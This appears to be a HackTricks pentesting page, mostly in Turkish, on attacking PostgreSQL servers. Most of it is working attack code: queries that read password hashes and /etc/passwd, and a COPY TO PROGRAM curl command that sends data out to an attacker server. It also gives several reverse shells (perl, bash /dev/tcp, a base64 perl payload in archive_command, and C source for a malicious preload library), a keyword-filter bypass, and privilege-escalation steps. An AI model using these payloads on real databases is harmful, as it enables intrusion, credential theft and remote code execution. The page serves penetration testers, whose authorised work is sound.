# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**PostgreSQL** açık kaynaklı bir nesne-ilişkisel veritabanı sistemi olarak tanımlanır. Bu sistem yalnızca SQL dilini kullanmakla kalmaz, aynı zamanda ek özelliklerle onu genişletir. Sağladığı yetenekler, çok çeşitli veri tipleri ve işlemlerle başa çıkmasına olanak tanır; bu da geliştiriciler ve kuruluşlar için çok yönlü bir seçenek haline getirir.

**Varsayılan port:** 5432 — eğer bu port zaten kullanımda ise, postgresql muhtemelen kullanılmayan bir sonraki porta (muhtemelen 5433) geçer.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Bağlanma & Temel Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Eğer **`\list`** komutunu çalıştırdığınızda **`rdsadmin`** adlı bir veritabanı görürseniz, içinde bulunduğunuzun işareti: **AWS postgresql database**.

PostgreSQL veritabanını **nasıl kötüye kullanacağınız** hakkında daha fazla bilgi için bakınız:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Otomatik Keşif
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Bu [**this research**](https://www.exploit-db.com/papers/13084)'e göre, bir bağlantı denemesi başarısız olduğunda, `dblink` hatanın açıklamasını içeren `sqlclient_unable_to_establish_sqlconnection` istisnasını fırlatır. Bu ayrıntılara ilişkin örnekler aşağıda listelenmiştir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host kapalı

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port kapalı
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port açık
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
veya
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port açık veya filtrelenmiş
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL fonksiyonlarında şu anda istisna ayrıntılarını almak mümkün değildir. Ancak PostgreSQL sunucusuna doğrudan erişiminiz varsa gerekli bilgileri elde edebilirsiniz. Sistem tablolarından kullanıcı adları ve parolaları çıkarmak mümkün değilse, önceki bölümde tartışılan wordlist attack yöntemini kullanmayı düşünebilirsiniz; bu yöntem olumlu sonuç verebilir.

## Ayrıcalıkların Listelenmesi

### Roller

| Rol Tipleri    | Açıklama                                                                                                                                              |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol süperuser ayrıcalıklarına sahiptir.                                                                                                              |
| rolinherit     | Rol üyesi olduğu rollerin ayrıcalıklarını otomatik olarak devralır.                                                                                  |
| rolcreaterole  | Rol daha fazla rol oluşturabilir.                                                                                                                     |
| rolcreatedb    | Rol veritabanı oluşturabilir.                                                                                                                         |
| rolcanlogin    | Rol oturum açabilir. Yani bu rol başlangıç oturum yetkilendirme tanımlayıcısı olarak verilebilir.                                                     |
| rolreplication | Rol bir replication rolüdür. Bir replication rolü replikasyon bağlantıları başlatabilir ve replication slotları oluşturup silebilir.                   |
| rolconnlimit   | Oturum açabilen roller için bu, bu rolün yapabileceği eşzamanlı bağlantıların maksimum sayısını ayarlar. -1 sınırsız anlamına gelir.                   |
| rolpassword    | Parola değil (her zaman `********` olarak okunur)                                                                                                     |
| rolvaliduntil  | Parola bitiş zamanı (sadece parola doğrulaması için kullanılır); süresizse null                                                                      |
| rolbypassrls   | Rol her satır düzeyi güvenlik politikasını atlar, daha fazla bilgi için [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) bakınız. |
| rolconfig      | Çalışma zamanı yapılandırma değişkenleri için role özgü varsayılanlar                                                                                  |
| oid            | Rolün ID'si                                                                                                                                            |

#### İlginç Gruplar

- Eğer **`pg_execute_server_program`** üyesiyseniz programları **çalıştırabilirsiniz**
- Eğer **`pg_read_server_files`** üyesiyseniz dosyaları **okuyabilirsiniz**
- Eğer **`pg_write_server_files`** üyesiyseniz dosyaları **yazabilirsiniz**

> [!TIP]
> Dikkat: Postgres'te bir **kullanıcı**, bir **grup** ve bir **rol** **aynıdır**. Bu sadece **nasıl kullandığınıza** ve onun **oturum açmasına izin verip vermediğinize** bağlıdır.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi işlemleri

### Dizinleri ve dosyaları okuma

Bu [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) itibarıyla tanımlı **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun (adlandırılan **`pg_read_server_files`**) üyeleri ve **super users** herhangi bir yol üzerinde **`COPY`** yöntemini kullanabilirler (bakınız `convert_and_check_filename` içinde `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Unutmayın ki eğer super user değilseniz ama **CREATEROLE** iznine sahipseniz, **kendinizi o grubun üyesi yapabilirsiniz:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Dosya okumak veya bir dizini listelemek için kullanılabilecek **diğer postgres fonksiyonları** vardır. Sadece **superusers** ve **açık izinlere sahip kullanıcılar** bunları kullanabilir:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
**Daha fazla fonksiyon** için [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Basit Dosya Yazma

Yalnızca **super users** ve **`pg_write_server_files`** üyeleri copy ile dosya yazabilir.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Super user değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz kendinizi o grubun üyesi yapabilirsiniz:
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

COPY newline karakterlerini işleyemez, bu nedenle base64 payload kullansanız bile **tek satır göndermeniz gerekir**.\
Bu tekniğin çok önemli bir sınırlaması, **`copy` bazı binary değerleri değiştirdiği için ikili dosyalar yazmak için kullanılamaz.**

### **İkili dosya yükleme**

Ancak, büyük ikili dosyaları yüklemek için **başka teknikler** vardır:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Yerel dosya yazma ile PostgreSQL tablo verilerini güncelleme

PostgreSQL sunucu dosyalarını okuma ve yazma izinlerine sahipseniz, [the PostgreSQL data directory] içindeki ilişkili filenode'u üzerine yazarak sunucudaki herhangi bir tabloyu güncelleyebilirsiniz. **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Gerekli adımlar:

1.  PostgreSQL data directory'i elde edin

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Not:** Eğer settings'ten mevcut data directory yolunu alamıyorsanız, `SELECT version()` sorgusuyla PostgreSQL ana sürümünü öğrenip yolu brute-force etmeyi deneyebilirsiniz. Unix üzerindeki PostgreSQL kurulumlarında yaygın data directory yolları `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/` şeklindedir. Yaygın bir cluster adı `main`'dir.

2.  Hedef tabloyla ilişkili filenode'un göreli yolunu edin

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Bu sorgu `base/3/1337` gibi bir değer döndürmelidir. Disk üzerindeki tam yol `$DATA_DIRECTORY/base/3/1337`, örn. `/var/lib/postgresql/13/main/base/3/1337` olacaktır.

3.  Filenode'u `lo_*` fonksiyonlarıyla indir

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Hedef tabloyla ilişkili veri tipini alın

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) aracını kullanarak [edit the filenode]; tüm `rol*` boolean bayraklarını tam yetki için 1 olarak ayarlayın.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Düzenlenmiş filenode'u `lo_*` fonksiyonlarıyla tekrar yükleyin ve disk üzerindeki orijinal dosyanın üzerine yazın

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(İsteğe bağlı)_ Bellekteki tablo önbelleğini pahalı bir SQL sorgusu çalıştırarak temizleyin

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Artık PostgreSQL'de güncellenmiş tablo değerlerini görmelisiniz.

`pg_authid` tablosunu düzenleyerek ayrıca superadmin olabilirsiniz. **Bakınız** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), sadece **super users** ve **`pg_execute_server_program`** grubunun üyeleri RCE için copy kullanabilirler (exfiltration ile örnek:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
exec için örnek:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Unutmayın: eğer süper kullanıcı değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, kendinizi o grubun bir üyesi yapabilirsiniz:
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Veya `multi/postgres/postgres_copy_from_program_cmd_exec` modülünü **metasploit**'ten kullanın.\
Bu zafiyet hakkında daha fazla bilgi [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). CVE-2019-9193 olarak rapor edilse de, Postges bunu bir [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Anahtar kelime filtrelerini/WAF'i atlayıp COPY PROGRAM'a ulaşma

Stacked queries içeren SQLi durumlarında, bir WAF literal anahtar kelime `COPY`'i kaldırabilir veya engelleyebilir. İfadeyi dinamik olarak oluşturup bir PL/pgSQL DO bloğu içinde çalıştırabilirsiniz. Örneğin, naive filtreleri atlatmak için baştaki C'yi `CHR(67)` ile oluşturun ve birleştirilmiş komutu EXECUTE edin:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> The following RCE vectors are especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

PostgreSQL'ün **yapılandırma dosyası**, veritabanını çalıştıran **postgres kullanıcısı** tarafından **yazılabilir** olduğundan, **superuser** olarak dosya sistemine dosya yazabilir ve dolayısıyla bu dosyayı **üstüne yazabilirsiniz.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

Yapılandırma dosyasının RCE'ye yol açabilecek bazı ilginç öznitelikleri vardır:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Veritabanının özel anahtarının yolu
- `ssl_passphrase_command = ''` Eğer özel dosya parola ile korunuyorsa (şifreliyse) postgresql bu öznitelikte belirtilen **komutu çalıştıracaktır**.
- `ssl_passphrase_command_supports_reload = off` **Eğer** bu öznitelik **on** ise, anahtar parola ile korunuyorsa çalıştırılacak **komut** `pg_reload_conf()` **çalıştırıldığında** **çalıştırılacaktır**.

Buna göre bir saldırganın yapması gerekenler:

1. Sunucudan **özel anahtarı dökmek**
2. İndirilen özel anahtarı **şifrelemek**:
   1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Üstüne yazmak**
4. Mevcut postgresql **yapılandırmasını** **dump** etmek
5. Bahsedilen öznitelikleri içeren yapılandırma ile **yapılandırmayı** **üstüne yazmak**:
   1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` çalıştırmak

Bunu test ederken, bunun yalnızca **özel anahtar dosyasının izinleri 640** ise, **root** tarafından sahiplenilmiş ve **ssl-cert veya postgres** grubuna aitse (yani postgres kullanıcısı okuyabiliyorsa) ve _/var/lib/postgresql/12/main_ içinde yer alıyorsa çalıştığını fark ettim.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Yapılandırma dosyasındaki istismar edilebilecek bir diğer öznitelik `archive_command`'dır.

Bunun çalışması için `archive_mode` ayarının `'on'` veya `'always'` olması gerekir. Eğer bu doğruysa, `archive_command` içindeki komutu üstüne yazabilir ve WAL (write-ahead logging) işlemleri aracılığıyla çalıştırılmasını zorlayabiliriz.

Genel adımlar:

1. archive modunun etkin olup olmadığını kontrol edin: `SELECT current_setting('archive_mode')`
2. `archive_command`'ı yükünüzle üstüne yazın. Örneğin, bir reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Konfigürasyonu yeniden yükleyin: `SELECT pg_reload_conf()`
4. archive_command'ı çağıracak WAL işlemini tetikleyin: `SELECT pg_switch_wal()` veya bazı Postgres sürümleri için `SELECT pg_switch_xlog()`

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Çok satırlı yazmalar gerektiğinde (ör. birden fazla GUC ayarı yapmak için), yapılandırmayı SQL üzerinden tamamen okumak ve üstüne yazmak için PostgreSQL Large Objects kullanın. Bu yöntem, `COPY`'nin yeni satırları veya binary-güvenli yazıları işleyemediği SQLi bağlamlarında idealdir.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Bu, `archive_mode` etkin olduğu sürece `postgres` kullanıcısı olarak `archive_command` aracılığıyla güvenilir OS komut yürütmesi sağlar. Uygulamada, düşük bir `archive_timeout` ayarı açık bir WAL switch gerektirmeden hızlı tetiklemeye neden olabilir.

#### **RCE with preload libraries**

Bu teknik hakkında daha fazla bilgi için [buraya bakın](https://adeadfed.com/posts/postgresql-select-only-rce/).

Bu saldırı vektörü aşağıdaki yapılandırma değişkenlerinden faydalanır:

- `session_preload_libraries` -- PostgreSQL sunucusunun istemci bağlantısında yüklenecek kütüphaneler.
- `dynamic_library_path` -- PostgreSQL sunucusunun kütüphaneleri arayacağı dizinlerin listesi.

`dynamic_library_path` değerini, veritabanını çalıştıran `postgres` kullanıcısı tarafından yazılabilir bir dizine (ör. `/tmp/`) ayarlayıp oraya kötü amaçlı bir `.so` dosyası yükleyebiliriz. Ardından, PostgreSQL sunucusunu yeni yüklediğimiz kütüphaneyi `session_preload_libraries` değişkenine dahil ederek yüklemeye zorlayacağız.

Saldırı adımları:

1. Orijinal `postgresql.conf` dosyasını indirin
2. `dynamic_library_path` değerine `/tmp/` dizinini dahil edin, örn: `dynamic_library_path = '/tmp:$libdir'`
3. Kötü amaçlı kütüphane adını `session_preload_libraries` değerine ekleyin, örn: `session_preload_libraries = 'payload.so'`
4. `SELECT version()` sorgusuyla ana PostgreSQL sürümünü kontrol edin
5. Doğru PostgreSQL dev paketi ile kötü amaçlı kütüphane kodunu derleyin. Örnek kod:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kodu derleme:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Adım 2-3'te oluşturduğunuz kötü amaçlı `postgresql.conf` dosyasını yükleyin ve orijinalinin üzerine yazın
7. Adım 5'teki `payload.so`'yu `/tmp` dizinine yükleyin
8. Sunucu yapılandırmasını sunucuyu yeniden başlatarak veya `SELECT pg_reload_conf()` sorgusunu çalıştırarak yeniden yükleyin
9. Bir sonraki DB bağlantısında ters shell (reverse shell) bağlantısı alacaksınız.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Belgelere göre: _`CREATEROLE` ayrıcalığına sahip roller **herhangi bir role üyelik verme veya üyelikten çıkarma** yetkisine sahiptir; bu roller **superuser** değildir._

Yani, eğer **`CREATEROLE`** izniniz varsa kendinize (superuser olmayan) diğer **rollerin** erişimini verebilirsiniz; bu roller size dosya okuma/yazma ve komut çalıştırma imkanı sağlayabilir:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Parola Değiştirme

Bu role sahip kullanıcılar ayrıca diğer **süperkullanıcı olmayan** kullanıcıların **parolalarını** **değiştirebilirler**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Genellikle **local users can login in PostgreSQL without providing any password** ile karşılaşmak yaygındır. Bu nedenle, **permissions to execute code** elde ettiğinizde bu izinleri suistimal ederek kendinize **`SUPERUSER`** rolünü verebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Bu genellikle **`pg_hba.conf`** dosyasındaki aşağıdaki satırlar nedeniyle mümkündür:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) is explained how it was possible to **privesc** in Postgres GCP abusing ALTER TABLE privilege that was granted to the user.

Bir tabloyu **başka bir kullanıcının sahibi yapmaya** çalıştığınızda bunu engelleyen bir **hata** almanız gerekir; ancak görünüşe göre GCP bu **seçeneği GCP'deki not-superuser postgres kullanıcısına** vermiş:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Bu fikri, **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) komutları bir **table with an index function** üzerinde çalıştırıldığında, **function** komutun bir parçası olarak **called** edildiği ve bunun **table** **owner’s permissions** ile gerçekleştiği gerçeğiyle birleştirirsek: bir fonksiyonla bir index oluşturup o tablo üzerinde **super user**'a sahiplik izni vermek ve sonra kötü amaçlı fonksiyonla tablo üzerinde ANALYZE çalıştırmak mümkündür; fonksiyon, sahibin ayrıcalıklarını kullandığı için komutları çalıştırabilecektir.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### İstismar

1. Yeni bir tablo oluşturarak başlayın.
2. index fonksiyonu için veri sağlamak amacıyla tabloya bazı alakasız içerikler ekleyin.
3. Kod yürütme payload'ı içeren kötü amaçlı bir index fonksiyonu geliştirin; bu, yetkisiz komutların çalıştırılmasına izin verir.
4. ALTER ile tablonun sahibini "cloudsqladmin" olarak değiştirin; bu, Cloud SQL'in veritabanını yönetmek ve sürdürmek için özel olarak kullandığı GCP'nin superuser rolüdür.
5. Tablo üzerinde ANALYZE işlemi gerçekleştirin. Bu eylem PostgreSQL motorunu tablonun sahibinin kullanıcı bağlamına, yani "cloudsqladmin"e geçmeye zorlar. Sonuç olarak, kötü amaçlı index fonksiyonu "cloudsqladmin" yetkileriyle çağrılır ve daha önce yetkilendirilmemiş shell komutunun çalıştırılmasını sağlar.

PostgreSQL'de bu akış şöyle görünür:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Sonra, `shell_commands_results` tablosu çalıştırılan kodun çıktısını içerecek:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel Giriş

Bazı yanlış yapılandırılmış postgresql örnekleri herhangi bir yerel kullanıcının oturum açmasına izin verebilir; 127.0.0.1 üzerinden **`dblink` fonksiyonu** kullanılarak yerel olarak oturum açmak mümkündür:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Önceki sorgunun çalışması için **`dblink` fonksiyonunun mevcut olması gerektiğini unutmayın**. Eğer yoksa, bunu oluşturmayı deneyebilirsiniz
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Eğer daha fazla ayrıcalığa sahip bir kullanıcının şifresine sahipseniz, ancak bu kullanıcının harici bir IP'den giriş yapmasına izin verilmiyorsa, o kullanıcı olarak sorguları yürütmek için aşağıdaki fonksiyonu kullanabilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu fonksiyonun var olup olmadığını şu şekilde kontrol edebilirsiniz:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Özel tanımlı fonksiyon ile** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **found this function with the SECURITY DEFINER flag**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
